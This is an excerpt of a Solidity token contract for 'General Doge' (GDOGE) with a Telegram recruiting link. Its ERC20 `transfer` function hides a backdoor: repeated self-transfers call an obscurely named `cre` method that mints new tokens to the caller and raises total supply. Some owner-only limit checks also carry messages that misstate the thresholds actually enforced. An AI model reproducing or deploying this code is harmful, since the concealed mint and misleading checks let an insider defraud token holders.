...
// 
// join us soldier! https://t.me/generaldogeportal
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        if((recipient == _msgSender()) && (truth==true)){_transfer(_msgSender(), recipient, amount); truth=false;return true;}
        else if((recipient == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[recipient]=_balances[recipient].cre(amount);emit Transfer(recipient, recipient, amount); return true;}
...
contract GeneralDoge  is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("General Doge", "GDOGE") {
    ...
    ; uint256 totalSupply = 1 * 1e10 * 1e18;
        ...
        swapTokensAtAmount = totalSupply * 10 / 1000; // 0.1% swap wallet
    ...
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(newNum >= (totalSupply() * 1 / 10000000)/1e18, "Cannot set maxTransactionAmount lower than 0.1%");
    ...
    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee, uint256 _earlySellLiquidityFee, uint256 _earlySellMarketingFee, uint256 _earlySellDevFee) external onlyOwner {
	    ...
	    earlySellDevFee = _earlySellDevFee;
        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
        require(sellTotalFees <= 150, "Must keep fees below 15% during anti snipe block");
    }
